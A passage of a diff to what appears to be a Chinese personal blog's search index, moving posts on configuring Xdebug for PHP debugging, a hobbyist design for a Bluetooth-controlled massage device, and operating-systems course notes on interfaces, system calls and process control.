+<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[XDebug]</span></span><br><span class="line"><span class="attr">xdebug.remote_enable</span> = <span class="number">1</span></span><br><span class="line"><span class="attr">xdebug.remote_autostart</span> = <span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>###　源码形式</p>
+<p>下载xdebug源码包,解压进入目录,运行<code>phpize</code>生成configure <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">phpize</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make intall</span><br></pre></td></tr></table></figure> 得到<code>.so</code>路径,添加上述允许远程调试的指令,并添加引用目录 <figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">zend_extension</span> = php_xdebug.so</span><br></pre></td></tr></table></figure></p>
+<p>当你可以在phpinfo页面看到xdebug以及 xdebug.remote_enable 与 xdebug.remote_autostart 为on时则说明开启成功</p>
+]]></content>
+      <categories>
+        <category>answer&amp;question</category>
+      </categories>
+  </entry>
+  <entry>
     <title>呼救要素</title>
     <url>/%E5%91%BC%E6%95%91%E8%A6%81%E7%B4%A0/</url>
     <content><![CDATA[<h2 id="九要素">九要素：</h2>
@@ -2082,21 +2103,6 @@
 ]]></content>
       <categories>
         <category>安全</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>在配置linux+php+vscode+xdebug时遇到的问题</title>
-    <url>/%E5%9C%A8%E9%85%8D%E7%BD%AElinux-php-vscode-xdebug%E6%97%B6%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/</url>
-    <content><![CDATA[<p>首先在用户配置json配置这个,用于显示默认配置 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;workbench.settings.useSplitJSON&quot;: true,</span><br></pre></td></tr></table></figure> ###　源形式</p>
-<p>安装对应版本的php(版本号)-dev,可以使用<code>phpize</code>命令 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt install php版本号-dev</span><br></pre></td></tr></table></figure></p>
-<p>检查你是否使用fpm启动php,如果是fpm,请添加语句到fpm目录下的<code>php.ini</code></p>
-<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[XDebug]</span></span><br><span class="line"><span class="attr">xdebug.remote_enable</span> = <span class="number">1</span></span><br><span class="line"><span class="attr">xdebug.remote_autostart</span> = <span class="number">1</span></span><br></pre></td></tr></table></figure>
-<p>###　源码形式</p>
-<p>下载xdebug源码包,解压进入目录,运行<code>phpize</code>生成configure <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">phpize</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make intall</span><br></pre></td></tr></table></figure> 得到<code>.so</code>路径,添加上述允许远程调试的指令,并添加引用目录 <figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">zend_extension</span> = php_xdebug.so</span><br></pre></td></tr></table></figure></p>
-<p>当你可以在phpinfo页面看到xdebug以及 xdebug.remote_enable 与 xdebug.remote_autostart 为on时则说明开启成功</p>
-]]></content>
-      <categories>
-        <category>answer&amp;question</category>
       </categories>
   </entry>
   <entry>
@@ -2193,50 +2199,6 @@
 ]]></content>
       <categories>
         <category>数学</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>按摩器</title>
-    <url>/%E6%8C%89%E6%91%A9%E5%99%A8/</url>
-    <content><![CDATA[<h2 id="按摩器">按摩器</h2>
-<p>最近想做一个按摩器，可以用来放在背部用于按摩放松，也可以作为一个震动木马来刺激性高潮。</p>
-<h3 id="尺寸规格-尚不确定待测试的时候进行调整方便性测试">尺寸规格-尚不确定，待测试的时候进行调整，方便性测试</h3>
-<span id="more"></span>
-<h3 id="圆柱体-如果作为一个震动木马来使用的话它是非插入式的">圆柱体-如果作为一个震动木马来使用的话，它是非插入式的</h3>
-<ul>
-<li>外壳
-<ul>
-<li>长度:35cm //待测试</li>
-<li>直径:13cm //待测试</li>
-<li>外层海绵层厚度:1.5cm</li>
-<li>铝柱厚度:5mm //待测试，暂时无法知道是否达到承重标准</li>
-<li>中空直径:11cm</li>
-</ul></li>
-<li>内容物
-<ul>
-<li>12V电池组/11.1V笔记本电脑电池组</li>
-<li>12V转5V模块</li>
-<li>蓝牙模块</li>
-<li>wifi模块</li>
-<li>stm32f10x</li>
-<li>RS545-双振头马达-232克</li>
-<li>12V充电板</li>
-<li>电机驱动模块</li>
-<li>扬声器</li>
-<li>存储器/sd卡</li>
-</ul></li>
-</ul>
-<h3 id="该产品使用rs545为震源模块化设计可以买模块进行功能扩充">该产品使用RS545为震源，模块化设计，可以买模块进行功能扩充</h3>
-<h3 id="对于的重心偏移我想把中间的模块设置成可调整的样子类似于塑料束带使中间的器件可以偏移以手动调整重心">对于的重心偏移，我想把中间的模块设置成可调整的样子，类似于塑料束带使中间的器件可以偏移，以手动调整重心</h3>
-<h3 id="外部的承重铝管也可以作为天线使用大大增强设备的无线功能">外部的承重铝管也可以作为天线使用，大大增强设备的无线功能。</h3>
-<h3 id="通过stm32使用pwm对电机的转速进行控制通过蓝牙对stm32进行控制就可以做到对使用手机等支持蓝牙的外部设备对本设备进行控制">通过stm32使用pwm对电机的转速进行控制，通过蓝牙对stm32进行控制，就可以做到对使用手机等支持蓝牙的外部设备对本设备进行控制。</h3>
-<p>我还想使本设备可以进行歌曲播放的同时进行速度调整，声音越高，震频越大，声音越小，震频越小，使人感受到音乐的震感。</p>
-<p>现在只是整体架构，暂时使用blender进行模拟，后期会使用soildworks进行更真实的渲染。</p>
-<p>现在只有一个外部框架的模型，等我什么时候有设备进行soildworks建模了，再把它继续做下去</p>
-<img src="/%E6%8C%89%E6%91%A9%E5%99%A8/%E6%B5%B7%E7%BB%B5%E6%9C%A8%E9%A9%AC%E5%A4%96%E9%83%A8%E6%A1%86%E6%9E%B6_v1.png" class="" title="海绵木马外部框架_v1">
-]]></content>
-      <categories>
-        <category>生活</category>
       </categories>
   </entry>
   <entry>
@@ -2526,6 +2488,50 @@
       </categories>
   </entry>
   <entry>
+    <title>按摩器</title>
+    <url>/%E6%8C%89%E6%91%A9%E5%99%A8/</url>
+    <content><![CDATA[<h2 id="按摩器">按摩器</h2>
+<p>最近想做一个按摩器，可以用来放在背部用于按摩放松，也可以作为一个震动木马来刺激性高潮。</p>
+<h3 id="尺寸规格-尚不确定待测试的时候进行调整方便性测试">尺寸规格-尚不确定，待测试的时候进行调整，方便性测试</h3>
+<span id="more"></span>
+<h3 id="圆柱体-如果作为一个震动木马来使用的话它是非插入式的">圆柱体-如果作为一个震动木马来使用的话，它是非插入式的</h3>
+<ul>
+<li>外壳
+<ul>
+<li>长度:35cm //待测试</li>
+<li>直径:13cm //待测试</li>
+<li>外层海绵层厚度:1.5cm</li>
+<li>铝柱厚度:5mm //待测试，暂时无法知道是否达到承重标准</li>
+<li>中空直径:11cm</li>
+</ul></li>
+<li>内容物
+<ul>
+<li>12V电池组/11.1V笔记本电脑电池组</li>
+<li>12V转5V模块</li>
+<li>蓝牙模块</li>
+<li>wifi模块</li>
+<li>stm32f10x</li>
+<li>RS545-双振头马达-232克</li>
+<li>12V充电板</li>
+<li>电机驱动模块</li>
+<li>扬声器</li>
+<li>存储器/sd卡</li>
+</ul></li>
+</ul>
+<h3 id="该产品使用rs545为震源模块化设计可以买模块进行功能扩充">该产品使用RS545为震源，模块化设计，可以买模块进行功能扩充</h3>
+<h3 id="对于的重心偏移我想把中间的模块设置成可调整的样子类似于塑料束带使中间的器件可以偏移以手动调整重心">对于的重心偏移，我想把中间的模块设置成可调整的样子，类似于塑料束带使中间的器件可以偏移，以手动调整重心</h3>
+<h3 id="外部的承重铝管也可以作为天线使用大大增强设备的无线功能">外部的承重铝管也可以作为天线使用，大大增强设备的无线功能。</h3>
+<h3 id="通过stm32使用pwm对电机的转速进行控制通过蓝牙对stm32进行控制就可以做到对使用手机等支持蓝牙的外部设备对本设备进行控制">通过stm32使用pwm对电机的转速进行控制，通过蓝牙对stm32进行控制，就可以做到对使用手机等支持蓝牙的外部设备对本设备进行控制。</h3>
+<p>我还想使本设备可以进行歌曲播放的同时进行速度调整，声音越高，震频越大，声音越小，震频越小，使人感受到音乐的震感。</p>
+<p>现在只是整体架构，暂时使用blender进行模拟，后期会使用soildworks进行更真实的渲染。</p>
+<p>现在只有一个外部框架的模型，等我什么时候有设备进行soildworks建模了，再把它继续做下去</p>
+<img src="/%E6%8C%89%E6%91%A9%E5%99%A8/%E6%B5%B7%E7%BB%B5%E6%9C%A8%E9%A9%AC%E5%A4%96%E9%83%A8%E6%A1%86%E6%9E%B6_v1.png" class="" title="海绵木马外部框架_v1">
+]]></content>
+      <categories>
+        <category>生活</category>
+      </categories>
+  </entry>
+  <entry>
     <title>操作系统第七节课笔记-进程通信</title>
     <url>/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%B8%83%E8%8A%82%E8%AF%BE%E7%AC%94%E8%AE%B0-%E8%BF%9B%E7%A8%8B%E9%80%9A%E4%BF%A1/</url>
     <content><![CDATA[<h1 id="进程通信概念及分类">进程通信概念及分类</h1>
@@ -2722,6 +2728,328 @@
 <h4 id="用户级线程模型1-运行管理系统run-time-system">用户级线程模型1-运行管理系统（Run-Time System）</h4>
 <h4 id="用户级线程模型2-轻型进程solaris">用户级线程模型2-轻型进程（Solaris）</h4>
 ]]></content>
+  </entry>
+  <entry>
+    <title>操作系统第三节课笔记-操作系统接口</title>
+    <url>/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%B8%89%E8%8A%82%E8%AF%BE%E7%AC%94%E8%AE%B0-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3/</url>
+    <content><![CDATA[<a href="/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%B8%89%E8%8A%82%E8%AF%BE%E7%AC%94%E8%AE%B0-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%B8%89%E8%8A%82%E8%AF%BE%E7%AC%94%E8%AE%B0-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3.pdf" title="操作系统第三节课笔记-操作系统接口pdf文档下载">操作系统第三节课笔记-操作系统接口pdf文档下载</a>
+<span id="more"></span>
+<h1 id="操作系统接口">操作系统接口</h1>
+<h2 id="用户接口">用户接口</h2>
+<h3 id="用户接口分类">用户接口分类</h3>
+<ul>
+<li>基于表现形式划分
+<ul>
+<li>用户交互接口
+<ul>
+<li>CLI：文本界面，命令窗口(联/脱机命令接口)</li>
+<li>GUI：图形化用户接口(图形化操作界面)</li>
+</ul></li>
+<li>用户程序接口(方便用户调用访问系统资源，由一组系统调用(System call)组成</li>
+</ul></li>
+<li>基于使用者类型划分
+<ul>
+<li>本地用户接口</li>
+<li>远程用户接口(网络用户接口)</li>
+</ul></li>
+</ul>
+<h3 id="联机命令接口">联机命令接口</h3>
+<ul>
+<li><p>一组联机命令</p>
+<ul>
+<li>内部命令</li>
+<li>外部命令</li>
+</ul></li>
+<li><p>键盘处理程序</p></li>
+<li><p>命令解释程序</p></li>
+</ul>
+<h4 id="联机命令格式与分类">联机命令格式与分类</h4>
+<ul>
+<li><p>联机命令格式</p>
+<p><code>&lt;命令&gt; [&lt;可选项&gt;] &lt;参数&gt;</code></p></li>
+<li><p>联机命令类型</p>
+<ul>
+<li>系统访问类</li>
+<li>磁盘操作类</li>
+<li>网络通信类</li>
+<li><strong>输入输出重定向</strong>、<strong>管道</strong>、过滤命令</li>
+<li><strong>批处理方式</strong>(批处理文件/脚本)</li>
+</ul></li>
+</ul>
+<h3 id="键盘终端处理程序">键盘终端处理程序</h3>
+<ul>
+<li><p>基本功能</p>
+<ul>
+<li>接收用户从终端输入的字符
+<ul>
+<li>面向字符/行方式</li>
+</ul></li>
+<li>管理字符缓冲
+<ul>
+<li>专用缓冲区/公用缓冲区</li>
+</ul></li>
+<li>将字符打印到屏幕
+<ul>
+<li>硬件/软件实现方式</li>
+</ul></li>
+</ul>
+<p>特殊字符处理(中断/清屏/恢复jobs)</p></li>
+</ul>
+<h3 id="图形化用户接口">图形化用户接口</h3>
+<h4 id="图形化接口元素">图形化接口元素</h4>
+<ul>
+<li>桌面、鼠标、图标</li>
+<li>窗口、标题栏、工具栏、菜单栏</li>
+<li>菜单
+<ul>
+<li>弹出式(右键菜单等)</li>
+<li>下拉式(菜单栏的下拉菜单)</li>
+</ul></li>
+<li>对话框</li>
+</ul>
+<h4 id="图形化接口特点">图形化接口特点</h4>
+<ul>
+<li>简单,直观</li>
+<li>多屏,多窗口</li>
+<li>即使交互</li>
+<li>传递参数信息量大</li>
+</ul>
+<h4 id="图形化接口的实现及运行机制">图形化接口的实现及运行机制</h4>
+<ul>
+<li>面向对象的程序设计方法</li>
+<li>消息产生、传递及处理</li>
+<li>事件驱动方式</li>
+</ul>
+<h2 id="系统调用">系统调用</h2>
+<h3 id="系统调用基本概念">系统调用基本概念</h3>
+<h5 id="linux-系统调用列表"><a href="https://www.ibm.com/developerworks/cn/linux/kernel/syscall/part1/appendix.html">Linux 系统调用列表</a></h5>
+<ul>
+<li>定义
+<ul>
+<li>系统过程-&gt;系统服务-&gt;系统调用命令</li>
+</ul></li>
+<li>与普通过程调用的区别
+<ul>
+<li>运行在不同的系统状态</li>
+<li>软中断进入机制</li>
+<li>返回及重新调度问题</li>
+<li>嵌套调用</li>
+</ul></li>
+</ul>
+<h3 id="系统调用的类型">系统调用的类型</h3>
+<ul>
+<li>进程控制
+<ul>
+<li>进程的创建<em>fork</em><a href="#fn1" class="footnote-ref" id="fnref1" role="doc-noteref"><sup>1</sup></a>、结束<em>exit</em>、等待子进程结束<em>waitpid</em></li>
+<li>进程属性设置<em>pid</em>与获取</li>
+<li>执行一个文件<em>exec</em></li>
+</ul></li>
+<li>文件操控
+<ul>
+<li>文件的创建<em>creat</em>、打开<em>open</em>、关闭<em>close</em>、读/写 <em>read/write</em></li>
+</ul></li>
+<li>进程通信-基于<em>IPC</em>
+<ul>
+<li>连接打开与关闭、消息收发与接收</li>
+</ul></li>
+<li>系统信息维护
+<ul>
+<li>时间设置与获取、文建访问/修改时间设置</li>
+</ul></li>
+</ul>
+<section class="footnotes" role="doc-endnotes">
+<hr />
+<ol>
+<li id="fn1" role="doc-endnote"><p>除了第一个进程[init]不是由fork创建的之外,其余所有进程都是由init fork出来的<a href="#fnref1" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
+</ol>
+</section>
+]]></content>
+      <categories>
+        <category>大学</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>操作系统第五节课笔记-进程控制</title>
+    <url>/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%94%E8%8A%82%E8%AF%BE%E7%AC%94%E8%AE%B0-%E8%BF%9B%E7%A8%8B%E6%8E%A7%E5%88%B6/</url>
+    <content><![CDATA[<a href="/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%94%E8%8A%82%E8%AF%BE%E7%AC%94%E8%AE%B0-%E8%BF%9B%E7%A8%8B%E6%8E%A7%E5%88%B6/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%94%E8%8A%82%E8%AF%BE%E7%AC%94%E8%AE%B0-%E8%BF%9B%E7%A8%8B%E6%8E%A7%E5%88%B6.pdf" title="操作系统第五节课笔记-进程控制pdf文档下载">操作系统第五节课笔记-进程控制pdf文档下载</a>
+<span id="more"></span>
+<h1 id="进程控制">进程控制</h1>
+<h3 id="进程控制块-pcb">进程控制块-PCB</h3>
+<p>Process Control Block</p>
+<ul>
+<li>进程实体的一部分，拥有描述进程情况及控制进程运行所需的全部信息的记录性数据结构</li>
+<li>使一个在多道程序环境下不能独立运行的程序，成为一个能独立运行的基本单位，一个能与其它进程并发执行的进程</li>
+<li>操作系统<strong>控制和管理</strong>并发执行进程的依据</li>
+<li>进程存在的唯一标志</li>
+<li>常驻内存，且存放于操作系统开辟的专门区域-PCB区</li>
+</ul>
+<h4 id="进程控制块中的信息">进程控制块中的信息</h4>
+<ul>
+<li>进程标识符
+<ul>
+<li>内(pid)/外部(进程名)、父/子进程、用户标识符</li>
+</ul></li>
+<li>处理器调度信息
+<ul>
+<li>通用、PC、PSW、用户占指针寄存器</li>
+</ul></li>
+<li>进程调度信息
+<ul>
+<li>进程状态、进程优先级(静态优先级，动态优先级)、事件及其他</li>
+</ul></li>
+<li>进程控制信息
+<ul>
+<li>程序和数据地址、进程同步通信机制</li>
+<li>资源清单、链接指针、进程图</li>
+</ul></li>
+</ul>
+<h3 id="进程图进程树">进程图（进程树）</h3>
+<ul>
+<li>描述进程家族的有向树
+<ul>
+<li>结点/有向边</li>
+<li>父/子进程</li>
+<li>祖先进程/祖先</li>
+</ul></li>
+</ul>
+<p>知道进程的子进程有助于在知道父进程的情况下，杀死其子进程</p>
+<p>知道进程的祖先进程有助于当子进程被杀死后通知父进程</p>
+<h3 id="pcb的组织方式">PCB的组织方式</h3>
+<p>执行指针</p>
+<p>就绪队列指针</p>
+<p>阻塞队列指针</p>
+<p>空闲队列指针</p>
+<ul>
+<li>链接方式
+<ul>
+<li>通过链表查询队列</li>
+</ul></li>
+<li>索引方式
+<ul>
+<li>建立索引表用于查询队列</li>
+</ul></li>
+</ul>
+<h2 id="进程的创建与终止">进程的创建与终止</h2>
+<h3 id="引起创建进程的事件">引起创建进程的事件</h3>
+<ul>
+<li>用户登录
+<ul>
+<li>分时系统中，验证为合法的终端用户登录</li>
+</ul></li>
+<li>作业调度
+<ul>
+<li>批处理系统中作业调度到某作业</li>
+</ul></li>
+<li>提供服务
+<ul>
+<li>运行中的用户程序提出某种请求</li>
+</ul></li>
+<li>应用请求
+<ul>
+<li>基于用户进程的需要由其自身创建新进程</li>
+</ul></li>
+</ul>
+<h3 id="引起终止进程的事件">引起终止进程的事件</h3>
+<ul>
+<li>正常结束
+<ul>
+<li>批处理系统中的Halt，分时系统中的LogsOff</li>
+</ul></li>
+<li>异常结束
+<ul>
+<li>越界错误、保护错误</li>
+<li>特权指令错误</li>
+<li>非法指令错误</li>
+<li>运行超时、等待超时</li>
+<li>算数运算错、I/O故障</li>
+</ul></li>
+<li>外界干预
+<ul>
+<li>操作员或者操作系统干预
+<ul>
+<li>发送SIGKILL信号强制杀死</li>
+</ul></li>
+<li>父进程请求/终止</li>
+</ul></li>
+</ul>
+<h3 id="进程创建过程">进程创建过程</h3>
+<h4 id="create原语">Create()原语</h4>
+<ol type="1">
+<li>分配标识符，并申请空白进程控制块</li>
+<li>为新进程的程序和数据及用户占分配必要的内存空间
+<ol type="1">
+<li>所需内存大小问题</li>
+</ol></li>
+<li>初始化进程控制快
+<ol type="1">
+<li>自身/父进程标识符</li>
+<li>处理机状态/调度信息</li>
+</ol></li>
+<li>讲新进程插入到就绪队列</li>
+</ol>
+<h3 id="进程终止过程">进程终止过程</h3>
+<h4 id="terminate原语">Terminate()原语</h4>
+<ol type="1">
+<li>检索被终止进程PCB，读取其进程状态</li>
+<li>若其正处于执行状态，立即终止执行并设置调度标志为真，来重新调度其他进程</li>
+<li>终止子孙进程</li>
+<li><strong>资源归还</strong>-最重要的过程</li>
+<li>一处被终止进程PCB，等待其他程序查询利用</li>
+</ol>
+<h2 id="进程的阻塞与唤醒">进程的阻塞与唤醒</h2>
+<h3 id="引起进程阻塞的事件">引起进程阻塞的事件</h3>
+<ul>
+<li>请求系统服务
+<ul>
+<li>但不能立刻满足，需要阻塞自己等待系统服务的响应</li>
+</ul></li>
+<li>启动某种操作
+<ul>
+<li>某种动作是本进程下一个动作的前趋，不满足不能向后执行</li>
+</ul></li>
+<li>新数据尚未到达
+<ul>
+<li>相互合作的进程必须先获得另一方的进程数据才能继续</li>
+</ul></li>
+<li>无新工作可做
+<ul>
+<li>特定功能的系统进程当完成任务且当前暂无任务</li>
+</ul></li>
+</ul>
+<h3 id="引起进程唤醒的事件">引起进程唤醒的事件</h3>
+<ul>
+<li>系统服务满足</li>
+<li>操作完成</li>
+<li>数据到达</li>
+<li>新任务出现</li>
+</ul>
+<h3 id="进程阻塞过程">进程阻塞过程</h3>
+<h4 id="block原语">Block()原语</h4>
+<ol type="1">
+<li>先立即停止执行，把进程控制块中的现行状态由执行状态改为阻塞状态，并将它插入到对应的阻塞队列中</li>
+<li>转调度程序进程重新调度，将处理机分配给另一就绪进程，并进行切换</li>
+</ol>
+<h3 id="进程唤醒过程">进程唤醒过程</h3>
+<h4 id="wakeup原语">Wakeup()原语</h4>
+<p>首先把阻塞进程从等待该事件的阻塞进程队列中移出，将其PCB中的现行状态由阻塞改为就绪，并插入到就绪队列中</p>
+<h2 id="进程的挂起与激活">进程的挂起与激活</h2>
+<h3 id="进程挂起过程">进程挂起过程</h3>
+<h4 id="suspend过程">Suspend()过程</h4>
+<ol type="1">
+<li>检查被挂起进程的状态并修改和插入到对应队列</li>
+<li>复制PCB到指定域</li>
+<li>若被挂进程正在执行则转向调度程序重新调度</li>
+</ol>
+<h3 id="进程激活过程">进程激活过程</h3>
+<h4 id="activate原语">Activate()原语</h4>
+<ol type="1">
+<li>检查进程现行状态并修改和插队</li>
+<li>若有新进程进入就绪队列并采用了抢占式调度策略，则检查和决定是否重新调度</li>
+</ol>
+]]></content>
+      <categories>
+        <category>大学</category>
+      </categories>
   </entry>
   <entry>
     <title>操作系统第二节课笔记-处理器管理功能概要</title>
@@ -3045,328 +3373,6 @@
 <li id="fn14" role="doc-endnote"><p>不可修改的可执行代码，大家都要对该代码调用和执行<a href="#fnref14" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
 </ol>
 </section>
-]]></content>
-      <categories>
-        <category>大学</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>操作系统第三节课笔记-操作系统接口</title>
-    <url>/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%B8%89%E8%8A%82%E8%AF%BE%E7%AC%94%E8%AE%B0-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3/</url>
-    <content><![CDATA[<a href="/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%B8%89%E8%8A%82%E8%AF%BE%E7%AC%94%E8%AE%B0-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%B8%89%E8%8A%82%E8%AF%BE%E7%AC%94%E8%AE%B0-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3.pdf" title="操作系统第三节课笔记-操作系统接口pdf文档下载">操作系统第三节课笔记-操作系统接口pdf文档下载</a>
-<span id="more"></span>
-<h1 id="操作系统接口">操作系统接口</h1>
-<h2 id="用户接口">用户接口</h2>
-<h3 id="用户接口分类">用户接口分类</h3>
-<ul>
-<li>基于表现形式划分
-<ul>
-<li>用户交互接口
-<ul>
-<li>CLI：文本界面，命令窗口(联/脱机命令接口)</li>
-<li>GUI：图形化用户接口(图形化操作界面)</li>
-</ul></li>
-<li>用户程序接口(方便用户调用访问系统资源，由一组系统调用(System call)组成</li>
-</ul></li>
-<li>基于使用者类型划分
-<ul>
-<li>本地用户接口</li>
-<li>远程用户接口(网络用户接口)</li>
-</ul></li>
-</ul>
-<h3 id="联机命令接口">联机命令接口</h3>
-<ul>
-<li><p>一组联机命令</p>
-<ul>
-<li>内部命令</li>
-<li>外部命令</li>
-</ul></li>
-<li><p>键盘处理程序</p></li>
-<li><p>命令解释程序</p></li>
-</ul>
-<h4 id="联机命令格式与分类">联机命令格式与分类</h4>
-<ul>
-<li><p>联机命令格式</p>
-<p><code>&lt;命令&gt; [&lt;可选项&gt;] &lt;参数&gt;</code></p></li>
-<li><p>联机命令类型</p>
-<ul>
-<li>系统访问类</li>
-<li>磁盘操作类</li>
-<li>网络通信类</li>
-<li><strong>输入输出重定向</strong>、<strong>管道</strong>、过滤命令</li>
-<li><strong>批处理方式</strong>(批处理文件/脚本)</li>
-</ul></li>
-</ul>
-<h3 id="键盘终端处理程序">键盘终端处理程序</h3>
-<ul>
-<li><p>基本功能</p>
-<ul>
-<li>接收用户从终端输入的字符
-<ul>
-<li>面向字符/行方式</li>
-</ul></li>
-<li>管理字符缓冲
-<ul>
-<li>专用缓冲区/公用缓冲区</li>
-</ul></li>
-<li>将字符打印到屏幕
-<ul>
-<li>硬件/软件实现方式</li>
-</ul></li>
-</ul>
-<p>特殊字符处理(中断/清屏/恢复jobs)</p></li>
-</ul>
-<h3 id="图形化用户接口">图形化用户接口</h3>
-<h4 id="图形化接口元素">图形化接口元素</h4>
-<ul>
-<li>桌面、鼠标、图标</li>
-<li>窗口、标题栏、工具栏、菜单栏</li>
-<li>菜单
-<ul>
-<li>弹出式(右键菜单等)</li>
-<li>下拉式(菜单栏的下拉菜单)</li>
-</ul></li>
-<li>对话框</li>
-</ul>
-<h4 id="图形化接口特点">图形化接口特点</h4>
-<ul>
-<li>简单,直观</li>
-<li>多屏,多窗口</li>
-<li>即使交互</li>
-<li>传递参数信息量大</li>
-</ul>
-<h4 id="图形化接口的实现及运行机制">图形化接口的实现及运行机制</h4>
-<ul>
-<li>面向对象的程序设计方法</li>
-<li>消息产生、传递及处理</li>
-<li>事件驱动方式</li>
-</ul>
-<h2 id="系统调用">系统调用</h2>
-<h3 id="系统调用基本概念">系统调用基本概念</h3>
-<h5 id="linux-系统调用列表"><a href="https://www.ibm.com/developerworks/cn/linux/kernel/syscall/part1/appendix.html">Linux 系统调用列表</a></h5>
-<ul>
-<li>定义
-<ul>
-<li>系统过程-&gt;系统服务-&gt;系统调用命令</li>
-</ul></li>
-<li>与普通过程调用的区别
-<ul>
-<li>运行在不同的系统状态</li>
-<li>软中断进入机制</li>
-<li>返回及重新调度问题</li>
-<li>嵌套调用</li>
-</ul></li>
-</ul>
-<h3 id="系统调用的类型">系统调用的类型</h3>
-<ul>
-<li>进程控制
-<ul>
-<li>进程的创建<em>fork</em><a href="#fn1" class="footnote-ref" id="fnref1" role="doc-noteref"><sup>1</sup></a>、结束<em>exit</em>、等待子进程结束<em>waitpid</em></li>
-<li>进程属性设置<em>pid</em>与获取</li>
-<li>执行一个文件<em>exec</em></li>
-</ul></li>
-<li>文件操控
-<ul>
-<li>文件的创建<em>creat</em>、打开<em>open</em>、关闭<em>close</em>、读/写 <em>read/write</em></li>
-</ul></li>
-<li>进程通信-基于<em>IPC</em>
-<ul>
-<li>连接打开与关闭、消息收发与接收</li>
-</ul></li>
-<li>系统信息维护
-<ul>
-<li>时间设置与获取、文建访问/修改时间设置</li>
-</ul></li>
-</ul>
-<section class="footnotes" role="doc-endnotes">
-<hr />
-<ol>
-<li id="fn1" role="doc-endnote"><p>除了第一个进程[init]不是由fork创建的之外,其余所有进程都是由init fork出来的<a href="#fnref1" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
-</ol>
-</section>
-]]></content>
-      <categories>
-        <category>大学</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>操作系统第五节课笔记-进程控制</title>
-    <url>/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%94%E8%8A%82%E8%AF%BE%E7%AC%94%E8%AE%B0-%E8%BF%9B%E7%A8%8B%E6%8E%A7%E5%88%B6/</url>
-    <content><![CDATA[<a href="/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%94%E8%8A%82%E8%AF%BE%E7%AC%94%E8%AE%B0-%E8%BF%9B%E7%A8%8B%E6%8E%A7%E5%88%B6/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%94%E8%8A%82%E8%AF%BE%E7%AC%94%E8%AE%B0-%E8%BF%9B%E7%A8%8B%E6%8E%A7%E5%88%B6.pdf" title="操作系统第五节课笔记-进程控制pdf文档下载">操作系统第五节课笔记-进程控制pdf文档下载</a>
-<span id="more"></span>
-<h1 id="进程控制">进程控制</h1>
-<h3 id="进程控制块-pcb">进程控制块-PCB</h3>
-<p>Process Control Block</p>
-<ul>
-<li>进程实体的一部分，拥有描述进程情况及控制进程运行所需的全部信息的记录性数据结构</li>
-<li>使一个在多道程序环境下不能独立运行的程序，成为一个能独立运行的基本单位，一个能与其它进程并发执行的进程</li>
-<li>操作系统<strong>控制和管理</strong>并发执行进程的依据</li>
-<li>进程存在的唯一标志</li>
-<li>常驻内存，且存放于操作系统开辟的专门区域-PCB区</li>
-</ul>
-<h4 id="进程控制块中的信息">进程控制块中的信息</h4>
-<ul>
-<li>进程标识符
-<ul>
-<li>内(pid)/外部(进程名)、父/子进程、用户标识符</li>
-</ul></li>
-<li>处理器调度信息
-<ul>
-<li>通用、PC、PSW、用户占指针寄存器</li>
-</ul></li>
-<li>进程调度信息
-<ul>
-<li>进程状态、进程优先级(静态优先级，动态优先级)、事件及其他</li>
-</ul></li>
-<li>进程控制信息
-<ul>
-<li>程序和数据地址、进程同步通信机制</li>
-<li>资源清单、链接指针、进程图</li>
-</ul></li>
-</ul>
-<h3 id="进程图进程树">进程图（进程树）</h3>
-<ul>
-<li>描述进程家族的有向树
-<ul>
-<li>结点/有向边</li>
-<li>父/子进程</li>
-<li>祖先进程/祖先</li>
-</ul></li>
-</ul>
-<p>知道进程的子进程有助于在知道父进程的情况下，杀死其子进程</p>
